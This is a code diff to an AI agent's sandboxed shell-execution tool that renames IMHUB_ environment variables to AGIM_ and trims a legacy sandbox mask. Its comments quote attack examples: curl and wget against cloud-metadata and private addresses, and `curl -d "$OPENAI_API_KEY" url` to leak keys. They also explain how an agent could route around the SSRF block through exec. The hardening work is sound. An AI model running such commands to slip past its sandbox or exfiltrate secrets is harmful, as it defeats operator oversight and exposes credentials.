@@ -5,7 +5,7 @@
 // sees an IM approval card per command per fingerprint.
 //
 // Sandbox:
-//   IMHUB_EXEC_SANDBOX=bwrap   (Linux only) wraps the command in
+//   AGIM_EXEC_SANDBOX=bwrap   (Linux only) wraps the command in
 //                              bubblewrap with:
 //                                --ro-bind /usr /usr
 //                                --ro-bind /lib /lib
@@ -23,19 +23,19 @@
 //                              ~/.agim/ / /root outside cwd. Pure UID
 //                              isolation. No net isolation by default
 //                              (operators who want it set
-//                              IMHUB_EXEC_SANDBOX_NET=off).
+//                              AGIM_EXEC_SANDBOX_NET=off).
 //   Default (v1.3.7, F2): when /usr/bin/bwrap exists the sandbox is ON
 //                         automatically. The danger-pattern denylist is a
 //                         tripwire, not a boundary — the real isolation is
 //                         the bwrap namespace, so it must not be opt-in.
-//   IMHUB_EXEC_SANDBOX=off → plain spawn, no isolation (warns loudly when
+//   AGIM_EXEC_SANDBOX=off → plain spawn, no isolation (warns loudly when
 //                            bwrap is installed but disabled).
 //   When bwrap is NOT installed → plain spawn (no isolation available).
 //
 // Other env knobs:
-//   IMHUB_EXEC_TIMEOUT_MS    default 60_000, hard cap 600_000
-//   IMHUB_EXEC_MAX_OUTPUT    default 32_768 bytes per stream
-//   IMHUB_EXEC_ENV_PASS      comma-separated extra env keys to forward to
+//   AGIM_EXEC_TIMEOUT_MS    default 60_000, hard cap 600_000
+//   AGIM_EXEC_MAX_OUTPUT    default 32_768 bytes per stream
+//   AGIM_EXEC_ENV_PASS      comma-separated extra env keys to forward to
 //                            the child (v1.3.7, F1 — default is a small
 //                            safe allow-list, NOT the whole process.env)
 
@@ -68,7 +68,7 @@ export function getExecTools(): ToolDef[] {
         'Execute a shell command in the agent\'s workspace. cwd defaults to the agent workspace; ' +
         'optional timeout_ms (default 60000, max 600000). Returns stdout, stderr, exit_code. ' +
         'Each invocation is approval-gated by default — the user sees an IM card with the command ' +
-        'and must allow. When IMHUB_EXEC_SANDBOX=bwrap (Linux), runs under bubblewrap so the ' +
+        'and must allow. When AGIM_EXEC_SANDBOX=bwrap (Linux), runs under bubblewrap so the ' +
         'command can\'t touch home dirs outside cwd.',
       parameters: {
         type: 'object',
@@ -86,8 +86,8 @@ export function getExecTools(): ToolDef[] {
 
 export interface ExecContext {
   cwd: string
-  /** v1.2.97 — when present, every spawned child gets IMHUB_RPC_SOCKET
-   *  and IMHUB_RPC_TOKEN env vars so a bgjob-launched Python (or any
+  /** v1.2.97 — when present, every spawned child gets AGIM_RPC_SOCKET
+   *  and AGIM_RPC_TOKEN env vars so a bgjob-launched Python (or any
    *  language) script can call back into agim's tool surface via the
    *  local RPC server. The token is bound to this exact RunContext so
    *  a worker can only drive its own IM thread. Caller (native/index.ts)
@@ -135,13 +135,13 @@ async function runExec(args: Record<string, unknown>, ctx: ExecContext, signal: 
   // URLs (e.g. `curl http://169.254.169.254/...`, `wget http://10.0.0.1/`).
   // Without this, a model that's been instructed "don't fetch internal
   // hosts" can bypass the web-tool SSRF block by piping through exec.
-  // Honours IMHUB_NATIVE_WEB_SSRF_WHITELIST (shared with web tools).
+  // Honours AGIM_NATIVE_WEB_SSRF_WHITELIST (shared with web tools).
   const internalUrlReason = scanCommandForInternalUrl(command)
   if (internalUrlReason) {
     log.warn({ event: 'exec.refused.internal_url', reason: internalUrlReason, commandPreview: command.slice(0, 120) })
     return {
       text: `native_exec refused: command contains a URL targeting a private/internal address (${internalUrlReason}). ` +
-        `If this is intentional, set IMHUB_NATIVE_WEB_SSRF_WHITELIST or IMHUB_NATIVE_WEB_ALLOW_PRIVATE=1.`,
+        `If this is intentional, set AGIM_NATIVE_WEB_SSRF_WHITELIST or AGIM_NATIVE_WEB_ALLOW_PRIVATE=1.`,
       isError: true,
       source: 'exec',
     }
@@ -150,15 +150,15 @@ async function runExec(args: Record<string, unknown>, ctx: ExecContext, signal: 
   const timeoutMs = clampTimeout(args.timeout_ms)
   const cwd = typeof args.cwd === 'string' && args.cwd.length > 0 ? args.cwd : ctx.cwd
 
-  const sandboxMode = (process.env.IMHUB_EXEC_SANDBOX || '').toLowerCase()
+  const sandboxMode = (process.env.AGIM_EXEC_SANDBOX || '').toLowerCase()
   const bwrapAvail = existsSync('/usr/bin/bwrap')
   // v1.3.7 (F2) — default-on: enable the sandbox whenever bwrap is present
-  // unless the operator explicitly opts out with IMHUB_EXEC_SANDBOX=off.
+  // unless the operator explicitly opts out with AGIM_EXEC_SANDBOX=off.
   // Previously this was opt-in (=== 'bwrap'), which left every default
   // deployment running native_exec unconfined despite bwrap being available.
   const sandboxConfigured = bwrapAvail && sandboxMode !== 'off'
   if (bwrapAvail && sandboxMode === 'off') warnSandboxDisabledOnce()
-  const sandboxNetOff = (process.env.IMHUB_EXEC_SANDBOX_NET || '').toLowerCase() === 'off'
+  const sandboxNetOff = (process.env.AGIM_EXEC_SANDBOX_NET || '').toLowerCase() === 'off'
 
   // v1.2.93 — sandbox carve-out for the bgjob long-task wrapper. bgjob
   // detaches its worker via setsid (Python `start_new_session=True`);
@@ -186,12 +186,12 @@ async function runExec(args: Record<string, unknown>, ctx: ExecContext, signal: 
     try {
       const { mintRpcToken, resolveSocketPath } = await import('./agim-rpc-server.js')
       const { token } = mintRpcToken(ctx.rpcCtx, 'native_exec')
-      extraEnv = { IMHUB_RPC_SOCKET: resolveSocketPath(), IMHUB_RPC_TOKEN: token }
+      extraEnv = { AGIM_RPC_SOCKET: resolveSocketPath(), AGIM_RPC_TOKEN: token }
     } catch (err) {
       log.debug({
         event: 'exec.rpc_mint_failed',
         err: err instanceof Error ? err.message : String(err),
-      }, 'failed to mint RPC token; child will boot without IMHUB_RPC_*')
+      }, 'failed to mint RPC token; child will boot without AGIM_RPC_*')
     }
   }
 
@@ -253,7 +253,7 @@ function warnSandboxDisabledOnce(): void {
   if (_warnedSandboxOff) return
   _warnedSandboxOff = true
   log.warn({ event: 'exec.sandbox.disabled_despite_bwrap' },
-    'IMHUB_EXEC_SANDBOX=off: bubblewrap is installed but the native_exec sandbox is disabled — commands run unconfined on the host')
+    'AGIM_EXEC_SANDBOX=off: bubblewrap is installed but the native_exec sandbox is disabled — commands run unconfined on the host')
 }
 
 // v1.3.7 (F1) — env allow-list. The child previously inherited the FULL
@@ -261,14 +261,14 @@ function warnSandboxDisabledOnce(): void {
 // agent process holds (*_API_KEY, DB_PASSWORD, SSH_*, …) and exfil it
 // straight past the SSRF guards (e.g. `curl -d "$OPENAI_API_KEY" url`).
 // We now forward only a small safe base set, the per-spawn RPC injection
-// (extraEnv), and any keys the operator opts into via IMHUB_EXEC_ENV_PASS.
+// (extraEnv), and any keys the operator opts into via AGIM_EXEC_ENV_PASS.
 const SAFE_ENV_KEYS = [
   'PATH', 'HOME', 'LANG', 'LC_ALL', 'LC_CTYPE', 'USER', 'LOGNAME',
   'TMP', 'TMPDIR', 'TEMP', 'TERM', 'SHELL', 'TZ', 'PWD',
 ] as const
 
 export function buildExecEnv(extraEnv?: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
-  const passExtra = (process.env.IMHUB_EXEC_ENV_PASS || '')
+  const passExtra = (process.env.AGIM_EXEC_ENV_PASS || '')
     .split(',').map((s) => s.trim()).filter(Boolean)
   const base: NodeJS.ProcessEnv = {}
   for (const k of [...SAFE_ENV_KEYS, ...passExtra]) {
@@ -364,10 +364,8 @@ function buildBwrapInvocation(command: string, cwd: string, netOff: boolean): { 
     '--proc', '/proc',
     '--dev', '/dev',
     '--tmpfs', '/tmp',
-    // Mask the agim per-user state dir (~/.agim/) — primary target.
-    // ~/.im-hub legacy path covered for older installs.
+    // Mask the agim per-user state dir (~/.agim/).
     '--tmpfs', `${home}/.agim`,
-    '--tmpfs', `${home}/.im-hub`,
     // Mask the parent of the workspace cwd so the agent can't list
     // sibling threads' workspaces. cwdParent is typically
     // ~/.agim-workspaces/native/, and other threads live there.
@@ -395,7 +393,7 @@ interface RunOpts { cwd: string; timeoutMs: number; signal: AbortSignal; extraEn
 
 function runChild(bin: string, argv: string[], opts: RunOpts): Promise<DispatcherResult> {
   return new Promise<DispatcherResult>((resolve) => {
-    const maxOutput = clampNumber(process.env.IMHUB_EXEC_MAX_OUTPUT, DEFAULT_MAX_OUTPUT, 1024, 1024 * 1024)
+    const maxOutput = clampNumber(process.env.AGIM_EXEC_MAX_OUTPUT, DEFAULT_MAX_OUTPUT, 1024, 1024 * 1024)
     let stdout = ''
     let stderr = ''
     let stdoutTruncated = false
@@ -471,7 +469,7 @@ export function clampTimeout(raw: unknown): number {
   if (Number.isFinite(fromArg) && fromArg > 0) {
     return clampMs(fromArg)
   }
-  const env = process.env.IMHUB_EXEC_TIMEOUT_MS
+  const env = process.env.AGIM_EXEC_TIMEOUT_MS
   if (env) {
     const n = Number(env)
     if (Number.isFinite(n) && n > 0) return clampMs(n)
